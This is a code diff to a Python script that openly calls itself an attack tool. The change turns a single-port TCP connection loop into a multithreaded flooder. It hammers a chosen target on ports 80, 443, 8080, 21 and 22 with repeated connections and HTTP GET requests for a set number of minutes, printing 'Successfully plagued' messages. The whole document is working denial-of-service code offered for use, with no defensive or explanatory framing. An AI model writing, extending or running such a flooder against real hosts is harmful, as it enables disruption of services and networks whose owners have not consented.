@@ -2,20 +2,29 @@
 import socket
 import time
 import os
+import threading
 
-def attack(target, duration):
+ports = [80, 443, 8080, 21, 22]  # Common ports to target
+
+def attack(target, port, duration):
     timeout = time.time() + duration * 60
-    while time.time() < timeout:
+    while time.time() &lt; timeout:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.settimeout(1)
         try:
-            s.connect((target, 80))
-            print(f"Successfully plagued! 🤢🦠 | Ping: {os.system(f'ping -c 1 {target} > /dev/null 2>&1 && echo "Ping: " || echo "Ping: "')} ")
+            s.connect((target, port))
+            start = time.time()
+            if port == 80:
+                s.send(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n\r\n")
+            s.recv(1024)
+            end = time.time()
+            ping = round((end - start) * 1000, 2)
+            print(f"Successfully plagued {target}:{port}! 🤢🦠 | Ping: {ping}ms")
         except Exception as e:
             print(f"Error: {e}")
         finally:
             s.close()
-    print("Attack completed.")
+    print(f"Attack completed on {target}:{port}.")
 
 def main():
     os.system('clear' if os.name == 'posix' else 'cls')
@@ -28,7 +37,9 @@ def main():
     
     print(f"Starting attack on {target} for {duration} minutes. Press Ctrl+C to stop.")
     try:
-        attack(target, duration)
+        for port in ports:
+            thread = threading.Thread(target=attack, args=(target, port, duration))
+            thread.start()
     except KeyboardInterrupt:
         print("Attack stopped by user.")
 
